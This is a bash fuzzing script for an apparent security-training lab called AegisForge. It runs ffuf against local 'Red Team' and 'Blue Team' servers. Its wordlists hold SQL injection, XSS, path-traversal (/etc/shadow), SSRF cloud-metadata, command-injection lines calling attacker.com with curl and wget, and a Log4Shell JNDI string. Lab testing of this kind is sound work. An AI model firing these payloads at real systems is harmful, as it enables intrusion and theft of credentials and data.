#!/bin/bash
# AegisForge FFUF Comprehensive Fuzzing Script
# Directory fuzzing, parameter fuzzing, and header injection testing
# Version: 2.0.0

set -e

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

# Configuration
RED_BASE_URL="http://localhost:5000"
BLUE_BASE_URL="http://localhost:5001"
OUTPUT_DIR="./ffuf_results"
TIMESTAMP=$(date +%Y%m%d_%H%M%S)
WORDLIST_DIR="./wordlists"

# Create directories
mkdir -p "${OUTPUT_DIR}"
mkdir -p "${WORDLIST_DIR}"

echo -e "${BLUE}╔════════════════════════════════════════════════════════════╗${NC}"
echo -e "${BLUE}║          AegisForge FFUF Comprehensive Fuzzing Suite       ║${NC}"
echo -e "${BLUE}╚════════════════════════════════════════════════════════════╝${NC}"
echo ""
echo -e "${YELLOW}[INFO]${NC} Starting FFUF fuzzing at $(date)"
echo -e "${YELLOW}[INFO]${NC} Red Team Target: ${RED_BASE_URL}"
echo -e "${YELLOW}[INFO]${NC} Blue Team Target: ${BLUE_BASE_URL}"
echo -e "${YELLOW}[INFO]${NC} Output directory: ${OUTPUT_DIR}"
echo ""

# ========================================
# Create Custom Wordlists
# ========================================
echo -e "${CYAN}[SETUP]${NC} Creating custom wordlists..."

# API Endpoints Wordlist
cat > "${WORDLIST_DIR}/api_endpoints.txt" << 'EOF'
api
api/v1
api/v2
api/admin
api/users
api/auth
api/login
api/register
api/config
api/debug
api/test
api/internal
api/private
api/injection
api/sqli
api/xss
api/access
api/idor
api/ssrf
api/redirect
api/business
api/error
api/info
api/health
api/vulnerabilities
api/ctf
api/ai
api/logs
admin
administrator
dashboard
panel
control
manage
system
test
dev
staging
backup
old
new
tmp
EOF

# Directory Wordlist
cat > "${WORDLIST_DIR}/directories.txt" << 'EOF'
admin
administrator
api
backup
config
dashboard
dev
docs
download
files
images
includes
lib
logs
old
panel
private
public
reports
static
system
temp
test
tmp
upload
uploads
user
users
assets
css
js
vendor
node_modules
.git
.env
.htaccess
web.config
EOF

# Parameter Wordlist
cat > "${WORDLIST_DIR}/parameters.txt" << 'EOF'
id
user
user_id
userid
username
name
email
password
pass
token
access_token
auth
key
api_key
secret
file
filename
path
url
redirect
return
callback
next
page
search
query
q
cmd
command
exec
sql
data
input
value
amount
price
quantity
role
admin
debug
test
mode
format
type
action
method
EOF

# SQL Injection Payloads
cat > "${WORDLIST_DIR}/sqli_payloads.txt" << 'EOF'
'
''
`
``
,
"
""
/
//
\
\\
;
' or "
-- or # 
' OR '1
' OR 1 -- -
" OR "" = "
" OR 1 = 1 -- -
' OR '' = '
' OR '1'='1
' OR '1'='1' --
' OR 1=1--
' OR 1=1#
' OR 1=1/*
admin' --
admin' #
admin'/*
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' AND SLEEP(5)--
' OR SLEEP(5)--
1' AND SLEEP(5)--
' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
'; WAITFOR DELAY '00:00:05'--
EOF

# XSS Payloads
cat > "${WORDLIST_DIR}/xss_payloads.txt" << 'EOF'
<script>alert(1)</script>
<script>alert('XSS')</script>
<script>alert(document.cookie)</script>
<img src=x onerror=alert(1)>
<img src=x onerror=alert('XSS')>
<svg/onload=alert(1)>
<svg/onload=alert('XSS')>
<body onload=alert(1)>
<iframe src=javascript:alert(1)>
<input onfocus=alert(1) autofocus>
<select onfocus=alert(1) autofocus>
<textarea onfocus=alert(1) autofocus>
<marquee onstart=alert(1)>
<details open ontoggle=alert(1)>
<object data=javascript:alert(1)>
<embed src=javascript:alert(1)>
javascript:alert(1)
'><script>alert(1)</script>
"><script>alert(1)</script>
</script><script>alert(1)</script>
%3Cscript%3Ealert(1)%3C/script%3E
&lt;script&gt;alert(1)&lt;/script&gt;
EOF

# Path Traversal Payloads
cat > "${WORDLIST_DIR}/path_traversal.txt" << 'EOF'
../
../../
../../../
../../../../
../../../../../
../../../../../../
../../../../../../../
../../../../../../../../
../../../../../../../../../
../../../../../../../../../../
/etc/passwd
/etc/shadow
/etc/hosts
/etc/hostname
/proc/self/environ
/proc/version
/proc/cmdline
..%2F
..%2F..%2F
..%252F
%2e%2e%2f
%2e%2e%5c
..%c0%af
..%c1%1c
..\
..\..\
..\..\..\
..\..\..\..\
EOF

# Command Injection Payloads
cat > "${WORDLIST_DIR}/command_injection.txt" << 'EOF'
; ls
| ls
|| ls
& ls
&& ls
`ls`
$(ls)
; cat /etc/passwd
| cat /etc/passwd
; whoami
| whoami
; id
| id
; uname -a
| uname -a
; sleep 5
| sleep 5
& ping -c 10 127.0.0.1
| ping -c 10 127.0.0.1
; curl http://attacker.com
| curl http://attacker.com
; wget http://attacker.com
| wget http://attacker.com
EOF

# SSRF Payloads
cat > "${WORDLIST_DIR}/ssrf_payloads.txt" << 'EOF'
http://localhost
http://127.0.0.1
http://0.0.0.0
http://[::1]
http://127.1
http://0177.0.0.1
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/user-data/
http://metadata.google.internal/computeMetadata/v1/
http://10.0.0.1
http://172.16.0.1
http://192.168.0.1
http://192.168.1.1
http://localtest.me
http://localhost.localdomain
file:///etc/passwd
file:///c:/windows/win.ini
EOF

# Header Injection Payloads
cat > "${WORDLIST_DIR}/header_values.txt" << 'EOF'
127.0.0.1
localhost
evil.com
192.168.1.1
<script>alert(1)</script>
' OR '1'='1
../../../etc/passwd
${jndi:ldap://attacker.com/a}
{{7*7}}
<img src=x onerror=alert(1)>
admin
administrator
true
false
1
0
-1
999999
null
undefined
EOF

echo -e "${GREEN}[SUCCESS]${NC} Wordlists created in ${WORDLIST_DIR}"
echo ""

# ========================================
# Function to run FFUF test
# ========================================
run_ffuf_test() {
    local test_name="$1"
    local ffuf_cmd="$2"
    local description="$3"
    
    echo -e "${BLUE}[TEST]${NC} ${test_name}"
    echo -e "       ${description}"
    
    # Run FFUF
    eval "${ffuf_cmd}" 2>&1 | tee -a "${OUTPUT_DIR}/ffuf_${TIMESTAMP}.log"
    
    if [ ${PIPESTATUS[0]} -eq 0 ]; then
        echo -e "       ${GREEN}✓ Test completed${NC}"
    else
        echo -e "       ${YELLOW}⚠ Test completed with warnings${NC}"
    fi
    echo ""
}

# ========================================
# Test 1: Directory Fuzzing
# ========================================
echo -e "${YELLOW}═══════════════════════════════════════════════════════════${NC}"
echo -e "${YELLOW}[CATEGORY] Directory Fuzzing${NC}"
echo -e "${YELLOW}═══════════════════════════════════════════════════════════${NC}"
echo ""

run_ffuf_test \
    "Directory Fuzzing - Red Team" \
    "ffuf -u ${RED_BASE_URL}/FUZZ -w ${WORDLIST_DIR}/directories.txt -mc 200,301,302,401,403 -o ${OUTPUT_DIR}/dir_fuzzing_red_${TIMESTAMP}.json -of json -t 50 -s" \
    "Fuzzing directories on Red Team server"

run_ffuf_test \
    "API Endpoint Fuzzing - Red Team" \
    "ffuf -u ${RED_BASE_URL}/FUZZ -w ${WORDLIST_DIR}/api_endpoints.txt -mc 200,301,302,401,403 -o ${OUTPUT_DIR}/api_fuzzing_red_${TIMESTAMP}.json -of json -t 50 -s" \
    "Fuzzing API endpoints on Red Team server"

run_ffuf_test \
    "Directory Fuzzing - Blue Team" \
    "ffuf -u ${BLUE_BASE_URL}/FUZZ -w ${WORDLIST_DIR}/directories.txt -mc 200,301,302,401,403 -o ${OUTPUT_DIR}/dir_fuzzing_blue_${TIMESTAMP}.json -of json -t 50 -s" \
    "Fuzzing directories on Blue Team server"

# ========================================
# Test 2: Parameter Fuzzing
# ========================================
echo -e "${YELLOW}═══════════════════════════════════════════════════════════${NC}"
echo -e "${YELLOW}[CATEGORY] Parameter Fuzzing${NC}"
echo -e "${YELLOW}═══════════════════════════════════════════════════════════${NC}"
echo ""

run_ffuf_test \
    "GET Parameter Discovery" \
    "ffuf -u ${RED_BASE_URL}/api/injection/sqli/boolean?FUZZ=1 -w ${WORDLIST_DIR}/parameters.txt -mc 200 -o ${OUTPUT_DIR}/param_fuzzing_get_${TIMESTAMP}.json -of json -t 50 -s" \
    "Discovering GET parameters"

run_ffuf_test \
    "POST Parameter Discovery" \
    "ffuf -u ${RED_BASE_URL}/api/auth/login -d 'FUZZ=test' -w ${WORDLIST_DIR}/parameters.txt -mc 200,400,401,403 -o ${OUTPUT_DIR}/param_fuzzing_post_${TIMESTAMP}.json -of json -t 50 -s" \
    "Discovering POST parameters"

# ========================================
# Test 3: SQL Injection Fuzzing
# ========================================
echo -e "${YELLOW}═══════════════════════════════════════════════════════════${NC}"
echo -e "${YELLOW}[CATEGORY] SQL Injection Fuzzing${NC}"
echo -e "${YELLOW}═══════════════════════════════════════════════════════════${NC}"
echo ""

run_ffuf_test \
    "SQLi - Boolean Endpoint" \
    "ffuf -u ${RED_BASE_URL}/api/injection/sqli/boolean?id=FUZZ -w ${WORDLIST_DIR}/sqli_payloads.txt -mc 200,500 -o ${OUTPUT_DIR}/sqli_boolean_${TIMESTAMP}.json -of json -t 20 -s" \
    "Fuzzing boolean-based SQL injection endpoint"

run_ffuf_test \
    "SQLi - Union Endpoint" \
    "ffuf -u ${RED_BASE_URL}/api/injection/sqli/union?id=FUZZ -w ${WORDLIST_DIR}/sqli_payloads.txt -mc 200,500 -o ${OUTPUT_DIR}/sqli_union_${TIMESTAMP}.json -of json -t 20 -s" \
    "Fuzzing UNION-based SQL injection endpoint"

run_ffuf_test \
    "SQLi - Time-based Endpoint" \
    "ffuf -u ${RED_BASE_URL}/api/injection/sqli/time-based?id=FUZZ -w ${WORDLIST_DIR}/sqli_payloads.txt -mc 200,500 -o ${OUTPUT_DIR}/sqli_time_${TIMESTAMP}.json -of json -t 10 -s" \
    "Fuzzing time-based SQL injection endpoint"

# ========================================
# Test 4: XSS Fuzzing
# ========================================
echo -e "${YELLOW}═══════════════════════════════════════════════════════════${NC}"
echo -e "${YELLOW}[CATEGORY] XSS Fuzzing${NC}"
echo -e "${YELLOW}═══════════════════════════════════════════════════════════${NC}"
echo ""

run_ffuf_test \
    "XSS - Reflected Endpoint" \
    "ffuf -u ${RED_BASE_URL}/api/xss/reflected?name=FUZZ -w ${WORDLIST_DIR}/xss_payloads.txt -mc 200 -o ${OUTPUT_DIR}/xss_reflected_${TIMESTAMP}.json -of json -t 30 -s" \
    "Fuzzing reflected XSS endpoint"

run_ffuf_test \
    "XSS - DOM Endpoint" \
    "ffuf -u ${RED_BASE_URL}/api/xss/dom?page=FUZZ -w ${WORDLIST_DIR}/xss_payloads.txt -mc 200 -o ${OUTPUT_DIR}/xss_dom_${TIMESTAMP}.json -of json -t 30 -s" \
    "Fuzzing DOM XSS endpoint"

# ========================================
# Test 5: Path Traversal Fuzzing
# ========================================
echo -e "${YELLOW}═══════════════════════════════════════════════════════════${NC}"
echo -e "${YELLOW}[CATEGORY] Path Traversal Fuzzing${NC}"
echo -e "${YELLOW}═══════════════════════════════════════════════════════════${NC}"
echo ""

run_ffuf_test \
    "Path Traversal" \
    "ffuf -u ${RED_BASE_URL}/api/info/path-traversal?file=FUZZ -w ${WORDLIST_DIR}/path_traversal.txt -mc 200,403 -o ${OUTPUT_DIR}/path_traversal_${TIMESTAMP}.json -of json -t 30 -s" \
    "Fuzzing path traversal endpoint"

# ========================================
# Test 6: Command Injection Fuzzing
# ========================================
echo -e "${YELLOW}═══════════════════════════════════════════════════════════${NC}"
echo -e "${YELLOW}[CATEGORY] Command Injection Fuzzing${NC}"
echo -e "${YELLOW}═══════════════════════════════════════════════════════════${NC}"
echo ""

run_ffuf_test \
    "Command Injection" \
    "ffuf -u ${RED_BASE_URL}/api/injection/command -d '{\"host\":\"FUZZ\"}' -H 'Content-Type: application/json' -w ${WORDLIST_DIR}/command_injection.txt -mc 200,500 -o ${OUTPUT_DIR}/command_injection_${TIMESTAMP}.json -of json -t 20 -s" \
    "Fuzzing command injection endpoint"

# ========================================
# Test 7: SSRF Fuzzing
# ========================================
echo -e "${YELLOW}═══════════════════════════════════════════════════════════${NC}"
echo -e "${YELLOW}[CATEGORY] SSRF Fuzzing${NC}"
echo -e "${YELLOW}═══════════════════════════════════════════════════════════${NC}"
echo ""

run_ffuf_test \
    "SSRF Testing" \
    "ffuf -u ${RED_BASE_URL}/api/ssrf/fetch -d '{\"url\":\"FUZZ\"}' -H 'Content-Type: application/json' -w ${WORDLIST_DIR}/ssrf_payloads.txt -mc 200,400,500 -o ${OUTPUT_DIR}/ssrf_${TIMESTAMP}.json -of json -t 20 -s" \
    "Fuzzing SSRF endpoint"

# ========================================
# Test 8: IDOR/Access Control Fuzzing
# ========================================
echo -e "${YELLOW}═══════════════════════════════════════════════════════════${NC}"
echo -e "${YELLOW}[CATEGORY] IDOR/Access Control Fuzzing${NC}"
echo -e "${YELLOW}═══════════════════════════════════════════════════════════${NC}"
echo ""

run_ffuf_test \
    "IDOR User ID Enumeration" \
    "ffuf -u ${RED_BASE_URL}/api/access/idor/FUZZ -w <(seq 1 1000) -mc 200,403 -o ${OUTPUT_DIR}/idor_enumeration_${TIMESTAMP}.json -of json -t 50 -s" \
    "Enumerating user IDs via IDOR"

# ========================================
# Test 9: Header Injection Fuzzing
# ========================================
echo -e "${YELLOW}═══════════════════════════════════════════════════════════${NC}"
echo -e "${YELLOW}[CATEGORY] Header Injection Fuzzing${NC}"
echo -e "${YELLOW}═══════════════════════════════════════════════════════════${NC}"
echo ""

run_ffuf_test \
    "X-Forwarded-For Injection" \
    "ffuf -u ${RED_BASE_URL}/api/health -H 'X-Forwarded-For: FUZZ' -w ${WORDLIST_DIR}/header_values.txt -mc 200 -o ${OUTPUT_DIR}/header_xff_${TIMESTAMP}.json -of json -t 50 -s" \
    "Testing X-Forwarded-For header injection"

run_ffuf_test \
    "Host Header Injection" \
    "ffuf -u ${RED_BASE_URL}/api/health -H 'Host: FUZZ' -w ${WORDLIST_DIR}/header_values.txt -mc 200,400 -o ${OUTPUT_DIR}/header_host_${TIMESTAMP}.json -of json -t 50 -s" \
    "Testing Host header injection"

run_ffuf_test \
    "User-Agent Injection" \
    "ffuf -u ${RED_BASE_URL}/api/health -H 'User-Agent: FUZZ' -w ${WORDLIST_DIR}/header_values.txt -mc 200 -o ${OUTPUT_DIR}/header_ua_${TIMESTAMP}.json -of json -t 50 -s" \
    "Testing User-Agent header injection"

# ========================================
# Test 10: Multi-parameter Fuzzing
# ========================================
echo -e "${YELLOW}═══════════════════════════════════════════════════════════${NC}"
echo -e "${YELLOW}[CATEGORY] Multi-parameter Fuzzing${NC}"
echo -e "${YELLOW}═══════════════════════════════════════════════════════════${NC}"
echo ""

run_ffuf_test \
    "Multi-param Fuzzing" \
    "ffuf -u ${RED_BASE_URL}/api/injection/sqli/boolean?id=FUZZ1&name=FUZZ2 -w ${WORDLIST_DIR}/sqli_payloads.txt:FUZZ1 -w ${WORDLIST_DIR}/xss_payloads.txt:FUZZ2 -mc 200,500 -o ${OUTPUT_DIR}/multi_param_${TIMESTAMP}.json -of json -t 20 -mode clusterbomb -s" \
    "Fuzzing multiple parameters simultaneously"

# ========================================
# Summary
# ========================================
echo -e "${YELLOW}═══════════════════════════════════════════════════════════${NC}"
echo -e "${YELLOW}[SUMMARY] Test Execution Complete${NC}"
echo -e "${YELLOW}═══════════════════════════════════════════════════════════${NC}"
echo ""
echo -e "${GREEN}[SUCCESS]${NC} All FFUF fuzzing tests completed"
echo -e "${YELLOW}[INFO]${NC} Results saved to: ${OUTPUT_DIR}"
echo -e "${YELLOW}[INFO]${NC} Wordlists saved to: ${WORDLIST_DIR}"
echo ""
echo -e "${BLUE}[REPORT]${NC} Generating summary report..."

# Generate summary report
{
    echo "AegisForge FFUF Fuzzing Summary"
    echo "================================"
    echo "Timestamp: $(date)"
    echo "Red Team Target: ${RED_BASE_URL}"
    echo "Blue Team Target: ${BLUE_BASE_URL}"
    echo ""
    echo "Test Results:"
    echo "-------------"
    find "${OUTPUT_DIR}" -name "*.json" -type f | wc -l | xargs echo "Total JSON reports generated:"
    echo ""
    echo "Detailed results available in: ${OUTPUT_DIR}"
    echo ""
    echo "Recommended next steps:"
    echo "1. Review all FFUF JSON output files in ${OUTPUT_DIR}"
    echo "2. Analyze discovered endpoints and vulnerabilities"
    echo "3. Compare Red Team vs Blue Team results"
    echo "4. Use findings for manual exploitation testing"
    echo "5. Document results for security training"
} > "${OUTPUT_DIR}/summary_report_${TIMESTAMP}.txt"

echo -e "${GREEN}[SUCCESS]${NC} Summary report generated: ${OUTPUT_DIR}/summary_report_${TIMESTAMP}.txt"
echo ""
echo -e "${BLUE}╔════════════════════════════════════════════════════════════╗${NC}"
echo -e "${BLUE}║              FFUF Fuzzing Complete!                         ║${NC}"
echo -e "${BLUE}╚════════════════════════════════════════════════════════════╝${NC}"
